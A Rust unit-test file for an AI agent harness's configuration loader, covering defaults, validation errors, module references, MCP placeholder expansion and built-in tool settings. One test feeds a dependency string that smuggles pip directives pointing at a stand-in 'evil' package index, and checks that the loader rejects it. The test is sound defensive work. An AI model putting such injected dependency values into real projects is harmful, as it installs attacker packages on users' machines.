//! The portable config, plus the built-in tool cases that need its JSON form. Module references
//! fail with the unsupported-module-reference error.

use std::path::{Path, PathBuf};

use serde_json::{Value, json};

use super::*;
use crate::agent::{MemoryOption, SessionOption, SkillsOption};
use crate::interventions::{InterventionValue, InterventionsOption};
use crate::test_support::{env, record_logs};
use crate::types::{BuiltinToolsOption, WebSearchSetting};

#[allow(clippy::needless_pass_by_value, reason = "callers pass json! literals")]
fn normalize(value: Value) -> strands::Result<HarnessAgentConfig> {
    normalize_harness_agent_config(&value)
}

fn rejection(value: Value) -> String {
    normalize(value).unwrap_err().to_string()
}

fn options_at(config: &HarnessAgentConfig, base_dir: &str) -> strands::Result<crate::HarnessAgentOptions> {
    harness_agent_options_from_config_with_env(config, Some(Path::new(base_dir)), &env(&[("HOME", "/home/me")]))
}

fn config(value: Value) -> HarnessAgentConfig {
    normalize(value).unwrap()
}

fn cwd() -> PathBuf {
    std::env::current_dir().unwrap()
}

fn intervention_text(options: &crate::HarnessAgentOptions) -> String {
    match &options.interventions {
        Some(InterventionsOption::Value(InterventionValue::Text(text))) => text.clone(),
        other => panic!("expected one text intervention, got {other:?}"),
    }
}

#[test]
fn normalizes_the_complete_portable_definition() {
    let config = config(json!({
        "name": "Reviewer",
        "description": "Reviews changes",
        "instructions": "Be strict.",
        "effort": "high",
        "builtinTools": { "*": false, "read": true, "web_fetch": { "model": "openai/gpt-5-mini" } },
        "caching": false,
        "contextManager": "agentic",
        "session": { "id": "review" },
        "skills": false,
        "memory": false,
        "interventions": "ask",
        "modelModule": { "kind": "model", "module": "custom-model", "export": "model" },
        "interventionModules": [{ "kind": "intervention", "module": "custom-policy", "export": "policy" }],
        "agentConfigModules": {
            "conversationManager": { "kind": "agent-config", "module": "conversation-manager", "export": "conversationManager" },
        },
        "dependencies": { "typescript": { "package": "^1.0.0" }, "python": ["package>=1"] },
        "agentConfig": { "maxParallelTools": 2 },
    }));
    let round_trip = serde_json::to_value(&config).unwrap();
    assert_eq!(normalize(round_trip).unwrap(), config);
    assert_eq!(config.effort, Effort::High);
    assert_eq!(config.context_manager, HarnessConfigContextManager::Agentic);
}

#[test]
fn serializes_the_defaults_with_the_ts_keys_in_order() {
    let value = serde_json::to_value(&*DEFAULT_HARNESS_AGENT_CONFIG).unwrap();
    assert_eq!(
        value,
        json!({
            "name": "Strands harness",
            "description": "",
            "instructions": "",
            "model": "bedrock/global.anthropic.claude-opus-5-5",
            "modelModule": null,
            "effort": "auto",
            "tools": [],
            "subagents": [],
            "mcpServers": {},
            "builtinTools": ["shell", "read", "write", "edit", "web_fetch", "web_search", "programmatic_tool_caller", "subagent"],
            "caching": true,
            "contextManager": "auto",
            "session": true,
            "skills": true,
            "memory": true,
            "memoryStores": [],
            "plugins": [],
            "builtinPlugins": ["environment"],
            "interventions": null,
            "interventionModules": [],
            "sandbox": null,
            "agentConfigModules": {},
            "dependencies": { "typescript": {}, "python": [] },
            "agentConfig": {},
        })
    );
    let keys: Vec<&String> = value.as_object().unwrap().keys().collect();
    assert_eq!(keys[0], "name");
    assert_eq!(keys[23], "agentConfig");
}

#[test]
fn maps_defaults_through_the_same_contract_create_harness_consumes() {
    let options = harness_agent_options_from_config(&DEFAULT_HARNESS_AGENT_CONFIG, None).unwrap();
    assert_eq!(options.name.as_deref(), Some("Strands harness"));
    assert!(
        matches!(&options.model, Some(strands::ModelSource::Id(model)) if model == "bedrock/global.anthropic.claude-opus-5-5")
    );
    assert_eq!(options.effort, Effort::Auto);
    assert!(matches!(
        options.context_manager,
        Some(strands::experimental::context_manager::ContextManagerStrategy::Auto)
    ));
    let Some(MemoryOption::On(memory)) = &options.memory else {
        panic!("memory on")
    };
    assert_eq!(memory.dir.as_deref(), Some(cwd().join(".agent/memory").as_path()));
    let Some(SessionOption::On(session)) = &options.session else {
        panic!("session on")
    };
    assert_eq!(session.dir.as_deref(), Some(cwd().join(".agent/sessions").as_path()));
    assert!(matches!(options.skills, Some(SkillsOption::Default)));
    assert!(options.builtin_tools.is_none());
    assert!(options.caching.is_none());
}

#[test]
fn forwards_a_disabled_session_as_off() {
    let options = options_at(&config(json!({ "session": false })), "/project").unwrap();
    assert!(matches!(options.session, Some(SessionOption::Off)));
}

#[test]
fn folds_context_manager_off_to_false_matching_python() {
    assert_eq!(
        config(json!({ "contextManager": "off" })).context_manager,
        HarnessConfigContextManager::Off
    );
    assert_eq!(
        config(json!({ "contextManager": false })).context_manager,
        HarnessConfigContextManager::Off
    );
    assert_eq!(
        serde_json::to_value(HarnessConfigContextManager::Off).unwrap(),
        json!(false)
    );
}

#[test]
fn fails_loudly_when_the_runtime_cannot_load_a_referenced_language() {
    let config = config(json!({
        "tools": [{ "kind": "tool", "module": "./tool.py", "language": "python", "files": ["./tool.py"] }],
    }));
    assert_eq!(
        options_at(&config, "/project").unwrap_err().to_string(),
        "module references are not supported in Rust yet (language \"python\")"
    );
}

#[test]
fn rejects_executable_values_declared_through_module_references() {
    let cases = [
        json!({ "tools": [{ "module": "./tool.ts", "export": "customTool", "language": "typescript" }] }),
        json!({ "agentConfigModules": { "conversationManager": { "module": "./hooks.ts" } } }),
        json!({ "interventionModules": [{ "module": "./policy.ts" }] }),
        json!({ "modelModule": { "module": "./model.ts" } }),
        json!({ "sandbox": { "module": "./sandbox.ts" } }),
        json!({ "subagents": [{ "module": "./agent.ts" }] }),
        json!({ "memoryStores": [{ "module": "./store.ts" }] }),
        json!({ "plugins": [{ "module": "./plugin.ts" }] }),
        json!({ "builtinTools": { "web_fetch": { "model": { "module": "./model.ts" } } } }),
    ];
    for case in cases {
        let message = options_at(&config(case.clone()), "/project").unwrap_err().to_string();
        assert!(
            message.starts_with("module references are not supported in Rust yet"),
            "{case}"
        );
    }
    let named = config(json!({ "tools": [{ "module": "./tool.ts", "language": "typescript" }] }));
    assert_eq!(
        options_at(&named, "/project").unwrap_err().to_string(),
        "module references are not supported in Rust yet (language \"typescript\")"
    );
    let unnamed = config(json!({ "plugins": [{ "module": "./plugin.ts" }] }));
    assert_eq!(
        options_at(&unnamed, "/project").unwrap_err().to_string(),
        "module references are not supported in Rust yet"
    );
}

#[test]
fn resolves_the_intervention_against_the_project_root_when_it_is_a_cedar_file() {
    for (value, expected) in [
        ("./policy.cedar", "/project/policy.cedar"),
        ("policies/policy.cedar", "/project/policies/policy.cedar"),
        ("  ./policy.cedar  ", "/project/policy.cedar"),
        ("/policies/policy.cedar", "/policies/policy.cedar"),
        ("~/policy.cedar", "/home/me/policy.cedar"),
        ("ask", "ask"),
        ("  Require approval for writes.  ", "  Require approval for writes.  "),
        ("./policy.cedar.bak", "./policy.cedar.bak"),
    ] {
        let config = config(json!({ "interventions": value }));
        let options = options_at(&config, "/project").unwrap();
        assert_eq!(intervention_text(&options), expected, "{value}");
        assert_eq!(
            config.interventions,
            Some(HarnessConfigInterventions::One(value.to_owned()))
        );
    }
}

#[test]
fn keeps_a_list_of_interventions_in_order() {
    let options = options_at(
        &config(json!({ "interventions": ["ask", "./policy.cedar"] })),
        "/project",
    )
    .unwrap();
    let Some(InterventionsOption::List(values)) = options.interventions else {
        panic!("a list")
    };
    let texts: Vec<String> = values
        .into_iter()
        .map(|value| match value {
            InterventionValue::Text(text) => text,
            InterventionValue::Handler(_) => panic!("text"),
        })
        .collect();
    assert_eq!(texts, ["ask", "/project/policy.cedar"]);
}

#[cfg(feature = "mcp")]
fn mcp_json(options: &crate::HarnessAgentOptions) -> Value {
    match &options.mcp_servers {
        Some(crate::McpServersOption::Json(servers)) => Value::Object(servers.clone()),
        other => panic!("expected a JSON server map, got {other:?}"),
    }
}

#[cfg(feature = "mcp")]
#[test]
fn expands_mcp_environment_placeholders_and_unwraps_the_server_map() {
    let config = config(json!({
        "mcpServers": { "mcpServers": { "private": {
            "url": "https://example.com/mcp",
            "headers": { "Authorization": "Bearer ${env:STRANDS_TEST_MCP_TOKEN}" },
        } } },
    }));
    let env = env(&[("STRANDS_TEST_MCP_TOKEN", "secret")]);
    let options = harness_agent_options_from_config_with_env(&config, None, &env).unwrap();
    assert_eq!(
        mcp_json(&options),
        json!({ "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer secret" } } })
    );
}

#[cfg(feature = "mcp")]
#[test]
fn expands_a_set_but_empty_environment_variable_to_the_empty_string() {
    let config = config(json!({
        "mcpServers": { "private": { "url": "https://example.com/mcp", "headers": { "X-Token": "${env:STRANDS_TEST_EMPTY}" } } },
    }));
    let env = env(&[("STRANDS_TEST_EMPTY", "")]);
    let options = harness_agent_options_from_config_with_env(&config, None, &env).unwrap();
    assert_eq!(
        mcp_json(&options),
        json!({ "private": { "url": "https://example.com/mcp", "headers": { "X-Token": "" } } })
    );
}

#[test]
fn rejects_a_missing_mcp_environment_variable_instead_of_passing_the_placeholder_through() {
    let config = config(json!({
        "mcpServers": { "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer ${MISSING_VAR}" } } },
    }));
    assert_eq!(
        options_at(&config, "/project").unwrap_err().to_string(),
        "Environment variable \"MISSING_VAR\" is not set."
    );
}

#[cfg(feature = "mcp")]
#[test]
fn loads_and_expands_file_backed_mcp_config() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(
        root.path().join("mcp.json"),
        json!({ "mcpServers": { "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer ${STRANDS_TEST_MCP_TOKEN}" } } } }).to_string(),
    )
    .unwrap();
    let config = config(json!({ "mcpServers": "./mcp.json" }));
    let env = env(&[("STRANDS_TEST_MCP_TOKEN", "secret")]);
    let options = harness_agent_options_from_config_with_env(&config, Some(root.path()), &env).unwrap();
    assert_eq!(
        mcp_json(&options),
        json!({ "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer secret" } } })
    );
}

#[cfg(feature = "mcp")]
#[test]
fn resolves_a_stdio_server_cwd_against_the_project_root() {
    let config = config(json!({
        "mcpServers": { "local": { "command": "node", "args": ["server.js"] }, "nested": { "command": "node", "cwd": "tools" } },
    }));
    let options = options_at(&config, "/project").unwrap();
    let servers = mcp_json(&options);
    assert_eq!(servers["local"]["cwd"], json!("/project"));
    assert_eq!(servers["nested"]["cwd"], json!("/project/tools"));
}

#[test]
fn rejects_python_dependency_entries_carrying_extra_pip_directives() {
    let message =
        rejection(json!({ "dependencies": { "python": ["requests\n--index-url http://evil/simple\nevilpkg"] } }));
    assert!(
        message.contains("dependencies.python entries must not contain line breaks."),
        "{message}"
    );
}

#[test]
fn resolves_state_directories_against_the_project_root_matching_python() {
    let config = config(json!({
        "session": { "id": "proj", "dir": ".agent/sessions" },
        "memory": { "dir": ".agent/memory" },
        "skills": [".agent/skills", "https://example.com/SKILL.md"],
    }));
    let options = options_at(&config, "/project").unwrap();
    let Some(SessionOption::On(session)) = &options.session else {
        panic!("session on")
    };
    assert_eq!(session.id.as_deref(), Some("proj"));
    assert_eq!(session.dir.as_deref(), Some(Path::new("/project/.agent/sessions")));
    let Some(MemoryOption::On(memory)) = &options.memory else {
        panic!("memory on")
    };
    assert_eq!(memory.dir.as_deref(), Some(Path::new("/project/.agent/memory")));
    let Some(SkillsOption::Sources(sources)) = &options.skills else {
        panic!("skill sources")
    };
    assert_eq!(
        sources,
        &[
            strands::vended_plugins::skills::SkillSource::Path("/project/.agent/skills".to_owned()),
            strands::vended_plugins::skills::SkillSource::Url("https://example.com/SKILL.md".to_owned()),
        ]
    );
}

#[test]
fn treats_the_retired_key_as_a_plain_unknown_key() {
    for key in [
        "thinking",
        "webFetchModel",
        "webFetchModelModule",
        "contextManagement",
        "sessionId",
        "sessionDir",
        "skillsDir",
        "memoryDir",
        "memoryManager",
    ] {
        let (logs, _guard) = record_logs();
        let config = normalize(json!({ key: "x" })).unwrap();
        let warnings = logs.lines("WARN");
        assert_eq!(warnings.len(), 1, "{key}");
        assert!(
            warnings[0].ends_with(&format!("Ignoring unknown agent config keys: {key}.")),
            "{key}"
        );
        assert_eq!(config, normalize(json!({})).unwrap());
    }
}

#[test]
fn passes_web_fetch_transport_through_the_config_bridge() {
    let config = config(json!({ "builtinTools": { "web_fetch": { "transport": "direct" } } }));
    assert_eq!(
        serde_json::to_value(&config.builtin_tools).unwrap(),
        json!({ "web_fetch": { "transport": "direct" } })
    );
    let options = options_at(&config, "/project").unwrap();
    let Some(BuiltinToolsOption::Mapping(mapping)) = options.builtin_tools else {
        panic!("a mapping")
    };
    let Some(Setting::Config(web_fetch)) = mapping.web_fetch else {
        panic!("a web_fetch config")
    };
    assert_eq!(web_fetch.transport, Some(WebFetchTransport::Direct));
    assert!(web_fetch.model.is_none());
}

#[test]
fn normalizes_a_builtin_tools_mapping_with_a_per_tool_web_fetch_config() {
    let mapping = json!({ "*": false, "shell": true, "web_fetch": { "model": "openai/gpt-5-mini" } });
    let config = config(json!({ "builtinTools": mapping }));
    let mapping = json!({ "*": false, "shell": true, "web_fetch": { "model": "openai/gpt-5-mini" } });
    assert_eq!(serde_json::to_value(&config.builtin_tools).unwrap(), mapping);
}

#[test]
fn normalizes_the_shell_programmatic_tool_caller_and_subagent_per_tool_configs() {
    let builtin_tools = json!({
        "shell": { "description": "Run a command." },
        "programmatic_tool_caller": { "allowedTools": ["read"], "timeout": 60 },
        "subagent": { "maxDepth": 1 },
    });
    let config = config(json!({ "builtinTools": &builtin_tools }));
    let normalized = serde_json::to_value(&config.builtin_tools).unwrap();
    assert_eq!(normalized["shell"], builtin_tools["shell"]);
    assert_eq!(normalized["programmatic_tool_caller"]["allowedTools"], json!(["read"]));
    assert_eq!(normalized["programmatic_tool_caller"]["timeout"].as_f64(), Some(60.0));
    assert_eq!(normalized["subagent"], builtin_tools["subagent"]);
    // An explicit `allowedTools: null` means all tools, like an absent key, so it is not kept;
    // `timeout: null` (no bound) differs from absent (900 s) and is.
    let nulls = json!({ "programmatic_tool_caller": { "allowedTools": null, "timeout": null } });
    let with_nulls = super::tests::config(json!({ "builtinTools": nulls }));
    assert_eq!(
        serde_json::to_value(&with_nulls.builtin_tools).unwrap(),
        json!({ "programmatic_tool_caller": { "timeout": null } })
    );
}

#[test]
fn rejects_the_per_tool_config() {
    for (builtin_tools, message) in [
        (
            json!({ "shell": { "model": "x" } }),
            "builtinTools.shell has unknown keys: model. Allowed: description.",
        ),
        (
            json!({ "shell": { "description": "" } }),
            "builtinTools.shell.description must be a non-empty string.",
        ),
        (
            json!({ "web_fetch": { "model": "" } }),
            "builtinTools.web_fetch.model must be a non-empty string.",
        ),
        (
            json!({ "web_fetch": { "transport": "wget" } }),
            "builtinTools.web_fetch.transport must be 'curl' or 'direct'.",
        ),
        (
            json!({ "web_search": { "fallback": "exa" } }),
            "builtinTools.web_search must be a boolean or 'exa'.",
        ),
        (
            json!({ "web_search": "bing" }),
            "builtinTools.web_search must be a boolean or 'exa'.",
        ),
        (
            json!({ "programmatic_tool_caller": { "allowedTools": "read" } }),
            "builtinTools.programmatic_tool_caller.allowedTools must be an array of non-empty strings or null.",
        ),
        (
            json!({ "programmatic_tool_caller": { "timeout": 0 } }),
            "builtinTools.programmatic_tool_caller.timeout must be a positive number or null.",
        ),
        (
            json!({ "subagent": { "maxDepth": 1.5 } }),
            "builtinTools.subagent.maxDepth must be a non-negative integer.",
        ),
        (
            json!({ "subagent": { "maxDepth": -1 } }),
            "builtinTools.subagent.maxDepth must be a non-negative integer.",
        ),
    ] {
        let message_got = rejection(json!({ "builtinTools": builtin_tools }));
        assert!(message_got.contains(message), "{message_got}");
    }
}

#[test]
fn rejects_an_unknown_built_in_tool_name_in_a_builtin_tools_mapping() {
    assert!(rejection(json!({ "builtinTools": { "grep": true } })).contains(
        "builtinTools has unknown keys: grep. Allowed: *, shell, read, write, edit, web_fetch, web_search, programmatic_tool_caller, subagent."
    ));
}

#[test]
fn rejects_an_effort_outside_the_enum() {
    assert!(rejection(json!({ "effort": "turbo" })).contains("effort"));
}

#[test]
fn maps_a_builtin_tools_mapping_into_create_harness_options() {
    let config = config(json!({
        "builtinTools": { "subagent": { "maxDepth": 1 }, "web_fetch": { "model": "openai/gpt-5-mini" }, "shell": false },
    }));
    let options = options_at(&config, "/project").unwrap();
    let Some(BuiltinToolsOption::Mapping(mapping)) = options.builtin_tools else {
        panic!("a mapping")
    };
    assert_eq!(
        mapping.subagent,
        Some(Setting::Config(crate::SubagentConfig { max_depth: Some(1) }))
    );
    assert_eq!(mapping.shell, Some(Setting::Enabled(false)));
    let Some(Setting::Config(web_fetch)) = mapping.web_fetch else {
        panic!("a web_fetch config")
    };
    assert!(matches!(web_fetch.model, Some(strands::ModelSource::Id(model)) if model == "openai/gpt-5-mini"));
}

#[test]
fn warns_about_unknown_config_keys_and_drops_them() {
    let (logs, _guard) = record_logs();
    let mut value = serde_json::to_value(&*DEFAULT_HARNESS_AGENT_CONFIG).unwrap();
    value["builtinTool"] = json!(["shell"]);
    let config = normalize(value).unwrap();
    assert_eq!(config, *DEFAULT_HARNESS_AGENT_CONFIG);
    assert!(logs.lines("WARN")[0].ends_with("Ignoring unknown agent config keys: builtinTool."));
}

#[test]
fn lists_unknown_config_keys_in_sorted_order() {
    let (logs, _guard) = record_logs();
    normalize(json!({ "zeta": 1, "alpha": 2, "mid": 3 })).unwrap();
    assert!(logs.lines("WARN")[0].ends_with("Ignoring unknown agent config keys: alpha, mid, zeta."));
}

#[test]
fn rejects_unknown_memory_subkeys_and_names_them() {
    let message =
        rejection(json!({ "memory": { "dir": "mem", "stores": [{ "kind": "memory-store", "module": "store" }] } }));
    assert!(message.contains("memory has unknown keys: stores. Allowed: dir."));
}

#[test]
fn reports_every_issue_on_its_own_line_under_the_json_path() {
    let message = rejection(json!({
        "name": "",
        "effort": "turbo",
        "tools": [{ "kind": "tool" }],
        "builtinTools": { "web_fetch": { "model": { "module": "" } } },
        "agentConfig": [],
    }));
    assert_eq!(
        message,
        [
            "Invalid agent config:",
            "name must be a non-empty string.",
            "effort must be one of: auto, off, minimal, low, medium, high, xhigh, max.",
            "tools[0].module must be a non-empty string.",
            "builtinTools.web_fetch.model.module must be a non-empty string.",
            "agentConfig must be an object.",
        ]
        .join("\n")
    );
}

#[test]
fn warns_when_memory_stores_are_given_while_memory_is_disabled() {
    let (logs, _guard) = record_logs();
    let config =
        normalize(json!({ "memory": false, "memoryStores": [{ "kind": "memory-store", "module": "store" }] })).unwrap();
    assert_eq!(config.memory, Setting::Enabled(false));
    assert!(logs.lines("WARN")[0].ends_with("Ignoring memoryStores because memory is false."));
}

#[test]
fn rejects_malformed_references_instead_of_dropping_them() {
    assert!(rejection(json!({ "tools": [{ "kind": "tool" }] })).contains("tools[0].module must be a non-empty string"));
}

#[test]
fn rejects_invalid_values() {
    for (value, message) in [
        (
            json!({ "tools": ["./tool.ts"] }),
            "tools[0] must be a module reference of kind \"tool\".",
        ),
        (
            json!({ "sandbox": "docker" }),
            "sandbox must be a module reference of kind \"sandbox\".",
        ),
        (
            json!({ "tools": [{ "module": "./tool.ts", "files": null }] }),
            "tools[0].files must be an array of non-empty strings.",
        ),
        (
            json!({ "contextManager": null }),
            "contextManager must be one of: auto, agentic, off, false.",
        ),
        (
            json!({ "contextManager": {} }),
            "contextManager must be one of: auto, agentic, off, false.",
        ),
        (
            json!({ "session": { "id": "" } }),
            "session.id must be a non-empty string.",
        ),
        (
            json!({ "session": { "id": "   " } }),
            "session.id must be a non-empty string.",
        ),
        (
            json!({ "session": { "id": null } }),
            "session.id must be a non-empty string.",
        ),
        (
            json!({ "session": { "dir": "" } }),
            "session.dir must be a non-empty string.",
        ),
        (
            json!({ "session": { "dir": null } }),
            "session.dir must be a non-empty string.",
        ),
        (
            json!({ "memory": { "dir": "" } }),
            "memory.dir must be a non-empty string.",
        ),
        (
            json!({ "memory": { "dir": null } }),
            "memory.dir must be a non-empty string.",
        ),
        (
            json!({ "skills": null }),
            "skills must be a boolean, a path string, or an array of path strings.",
        ),
        (json!({ "skills": ["a", "b", "a"] }), "skills has duplicate entries: a."),
        (
            json!({ "dependencies": { "python": ["requests", "httpx", "requests", "httpx"] } }),
            "dependencies.python has duplicate entries: requests, httpx.",
        ),
    ] {
        let got = rejection(value.clone());
        assert!(got.contains(message), "{value}: {got}");
    }
}

#[test]
fn names_the_record_key() {
    for (value, message) in [
        (
            json!({ "agentConfigModules": { "": { "module": "./hooks.ts" } } }),
            "agentConfigModules has an invalid key \"\": must be a non-empty string.",
        ),
        (
            json!({ "dependencies": { "typescript": { "": "^1.0.0" } } }),
            "dependencies.typescript has an invalid key \"\": must be a non-empty string.",
        ),
    ] {
        assert!(rejection(value).contains(&format!("Invalid agent config:\n{message}")));
    }
}

#[test]
fn keeps_module_reference_extras_an_empty_files_list_and_repeated_dependency_versions() {
    let config = config(json!({
        "tools": [{ "module": "./tool.ts", "files": [], "foo": 1 }],
        "dependencies": { "typescript": { "a": "^1.0.0", "b": "^1.0.0" } },
    }));
    assert_eq!(
        serde_json::to_value(&config.tools).unwrap(),
        json!([{ "kind": "tool", "module": "./tool.ts", "files": [], "foo": 1 }])
    );
    assert_eq!(
        serde_json::to_value(&config.dependencies).unwrap()["typescript"],
        json!({ "a": "^1.0.0", "b": "^1.0.0" })
    );
}

#[test]
fn rejects_a_non_object_config() {
    assert_eq!(rejection(json!([])), "agent config must be an object.");
}

#[test]
fn parses_a_config_through_serde() {
    let parsed: HarnessAgentConfig =
        serde_json::from_value(json!({ "builtinTools": { "web_search": "exa" } })).unwrap();
    let HarnessConfigBuiltinToolsOption::Mapping(mapping) = parsed.builtin_tools else {
        panic!("a mapping")
    };
    assert_eq!(mapping.web_search, Some(WebSearchSetting::Exa));
    let error = serde_json::from_value::<HarnessAgentConfig>(json!({ "name": "" })).unwrap_err();
    assert_eq!(
        error.to_string(),
        "Invalid agent config:\nname must be a non-empty string."
    );
}

#[test]
fn define_harness_agent_config_validates_a_config_built_in_code() {
    let config = define_harness_agent_config(HarnessAgentConfig {
        name: "Reviewer".to_owned(),
        builtin_plugins: vec![BuiltinPluginName::Environment],
        ..Default::default()
    })
    .unwrap();
    assert_eq!(config.builtin_plugins, [BuiltinPluginName::Environment]);
    let error = define_harness_agent_config(HarnessAgentConfig {
        builtin_plugins: vec![BuiltinPluginName::Environment, BuiltinPluginName::Environment],
        ..Default::default()
    })
    .unwrap_err();
    assert!(
        error
            .to_string()
            .contains("builtinPlugins must not contain duplicates.")
    );
}

mod builtin_tool_config_keys {
    use super::*;

    #[test]
    fn pins_the_configurable_tools_and_their_keys() {
        let keys: Vec<(&str, &[&str])> = BUILTIN_TOOL_CONFIG_KEYS
            .iter()
            .map(|(name, keys)| (name.as_str(), *keys))
            .collect();
        assert_eq!(
            keys,
            [
                ("read", &["media"][..]),
                ("shell", &["description"][..]),
                ("web_fetch", &["model", "transport"][..]),
                ("programmatic_tool_caller", &["allowedTools", "timeout"][..]),
                ("subagent", &["maxDepth"][..]),
            ]
        );
        assert_eq!(BuiltinToolName::Write.config_keys(), None);
    }

    #[test]
    fn derives_the_keys_from_its_config_schema() {
        for (name, keys) in BUILTIN_TOOL_CONFIG_KEYS {
            for key in *keys {
                let message = normalize(json!({ "builtinTools": { name.as_str(): { *key: "bogus" } } }))
                    .err()
                    .map(|error| error.to_string())
                    .unwrap_or_default();
                assert!(!message.contains("has unknown keys"), "{name}.{key}: {message}");
            }
            let message = rejection(json!({ "builtinTools": { name.as_str(): { "bogus": true } } }));
            assert!(
                message.contains(&format!(
                    "builtinTools.{name} has unknown keys: bogus. Allowed: {}.",
                    keys.join(", ")
                )),
                "{message}"
            );
        }
    }

    #[test]
    fn rejects_a_config_object_on_write_and_edit_which_take_none() {
        for name in ["write", "edit"] {
            assert!(
                rejection(json!({ "builtinTools": { name: {} } }))
                    .contains(&format!("builtinTools.{name} must be a boolean."))
            );
        }
    }

    #[test]
    fn rejects_a_non_boolean_value() {
        assert!(
            rejection(json!({ "builtinTools": { "read": "yes" } }))
                .contains("builtinTools.read must be a boolean or a config object.")
        );
    }

    #[test]
    fn rejects_a_non_boolean_star() {
        assert!(rejection(json!({ "builtinTools": { "*": "all" } })).contains("builtinTools.* must be a boolean."));
    }

    #[test]
    fn rejects_an_unknown_name_in_a_list() {
        assert!(rejection(json!({ "builtinTools": ["grep"] })).contains(
            "builtinTools[0] must be one of: shell, read, write, edit, web_fetch, web_search, programmatic_tool_caller, subagent."
        ));
        assert_eq!(
            "grep".parse::<BuiltinToolName>().unwrap_err().to_string(),
            "Unknown built-in tool \"grep\". Available: shell, read, write, edit, web_fetch, web_search, programmatic_tool_caller, subagent."
        );
    }

    #[test]
    fn rejects_an_unknown_built_in_plugin() {
        assert_eq!(
            "memories".parse::<BuiltinPluginName>().unwrap_err().to_string(),
            "Unknown built-in plugin \"memories\". Available: environment."
        );
        assert_eq!(
            "todos".parse::<BuiltinPluginName>().unwrap_err().to_string(),
            "Unknown built-in plugin \"todos\". Available: environment."
        );
    }
}
